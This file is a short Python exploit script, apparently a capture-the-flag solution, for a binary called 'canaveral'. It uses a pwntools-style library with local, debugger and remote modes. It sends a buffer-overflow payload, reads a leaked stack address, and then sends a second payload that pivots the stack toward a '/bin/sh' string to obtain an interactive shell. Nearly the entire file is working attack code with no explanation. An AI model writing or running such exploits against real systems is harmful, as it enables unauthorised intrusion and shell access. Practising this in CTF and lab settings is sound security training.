#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./canaveral', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *0x4012B5
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

# ==================== EXPLOIT ====================
p = start()

binsh = 0x402008
payload = b'A' * 0x48 + p64(0x40101a) + p64(exe.sym.vuln)

sa(b'Enter the launch sequence: ', payload)
ru(b'Here\'s your prize: ')
stack_leak = hexleak(rl()[:-1])
slog(f'Stack leak @ %#x', stack_leak)

payload = p64(binsh) * 8 + p64(stack_leak + 0x20) + p64(0x401218)

sleep(1)
sa(b'Enter the launch sequence: ', payload)

interactive(flag=False)
